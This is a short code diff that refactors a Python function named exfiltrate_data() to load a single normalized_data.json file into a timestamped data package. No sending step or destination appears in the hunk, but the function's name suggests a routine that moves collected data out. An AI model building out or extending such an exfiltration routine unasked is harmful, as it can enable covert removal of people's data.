@@ -25,15 +25,16 @@ def exfiltrate_data():
         return
     
     try:
-        comprehensive_data_file = f"{DATA_DIR}/comprehensive_data.json"
-        if os.path.exists(comprehensive_data_file):
+        # Use normalized_data.json (ONLY FILE - clean, deduplicated, accurate)
+        data_file = f"{DATA_DIR}/normalized_data.json"
+        
+        data_package = {}
+        if os.path.exists(data_file):
             try:
-                with open(comprehensive_data_file, 'r', encoding='utf-8') as f:
+                with open(data_file, 'r', encoding='utf-8') as f:
                     data_package = json.load(f)
             except:
                 data_package = {}
-        else:
-            data_package = {}
         
         if 'timestamp' not in data_package:
             data_package['timestamp'] = time.strftime("%Y-%m-%dT%H:%M:%S")
